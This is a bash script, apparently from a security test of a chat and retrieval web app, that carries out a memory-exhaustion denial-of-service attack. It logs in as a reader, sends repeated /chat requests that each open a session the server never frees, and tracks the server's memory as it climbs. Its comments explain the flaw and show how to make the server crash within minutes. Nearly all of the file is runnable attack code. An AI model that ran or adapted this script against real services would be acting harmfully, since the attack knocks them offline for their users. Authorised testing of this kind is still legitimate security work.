#!/usr/bin/env bash
# Phase 2 attack: persistent memory-exhaustion DoS via the unbounded session store.
#
# app/chat.py keeps every /chat session in an in-memory dict (_SESSIONS) with a
# per-session turn cap but NO cap on session count and NO eviction (the module
# docstring says so: "no eviction beyond a turn cap"). Every /chat with no
# session_id creates a session that is never freed. Sustained, the process RSS
# climbs without bound until the OS OOM-kills uvicorn — and unlike the blocking-
# loop DoS, the app does NOT recover when the attack stops: the leaked memory
# stays leaked, so the process is on a one-way path to death.
#
# This script drives that leak with one reader account and samples the server's
# RSS so the climb is visible. It does NOT wait for OOM (hours on a laptop,
# because each /chat is gated by a model generation). The confirmation is the
# signature: RSS rises monotonically and does NOT drop after you Ctrl-C.
#
# To force an actual crash quickly, run the server under a memory cap so this
# leak crosses it in minutes:
#   python3 -c 'import resource,uvicorn; \
#     resource.setrlimit(resource.RLIMIT_AS,(700*1024*1024,)*2); \
#     uvicorn.run("app.main:app")'
# then run this script against it — the process dies and stays dead until restart.
#
# Usage: ./dos_chat_leak.sh [concurrency]     (default 2)
# Env:   SECURERAG_URL, ATTACK_USER/ATTACK_PASS
set -euo pipefail

BASE="${SECURERAG_URL:-http://localhost:8000}"
USER="${ATTACK_USER:-carol}"
PASS="${ATTACK_PASS:-pw-carol}"
CONC="${1:-2}"
PORT="${BASE##*:}"; PORT="${PORT%%/*}"
# Short prompt that still retrieves (stays on the model path) so generations are
# quick and sessions leak as fast as the model allows.
PROMPT='What is the refund window for standard orders?'

TOKEN=$(curl -s -X POST "$BASE/login" -H "content-type: application/json" \
  -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}" | jq -r .token)
[ "$TOKEN" != "null" ] && [ -n "$TOKEN" ] || { echo "login failed for $USER"; exit 1; }

PID=$(lsof -nP -iTCP:"$PORT" -sTCP:LISTEN -t 2>/dev/null | head -1 || true)
rss() { [ -n "$PID" ] && ps -o rss= -p "$PID" 2>/dev/null | tr -d ' ' || echo "?"; }
BASELINE=$(rss)
echo "[*] logged in as $USER (reader); server pid=${PID:-unknown}, baseline RSS=${BASELINE} KB"
echo "[*] leaking chat sessions ($CONC concurrent) — Ctrl-C to stop"

trap 'kill 0 2>/dev/null; echo; echo "[*] stopped. final RSS=$(rss) KB (baseline ${BASELINE}) — leaked memory does NOT come back."' EXIT INT TERM

BODY="{\"message\":$(jq -Rn --arg p "$PROMPT" '$p')}"   # no session_id => new session every call
N=0
while :; do
  PIDS=()
  for i in $(seq 1 "$CONC"); do
    curl -s -o /dev/null -X POST "$BASE/chat" \
      -H "authorization: Bearer $TOKEN" -H "content-type: application/json" \
      -d "$BODY" &
    PIDS+=($!)
  done
  wait "${PIDS[@]}"
  N=$((N + CONC))
  printf '    sessions leaked: %-6d  server RSS: %s KB\n' "$N" "$(rss)"
done
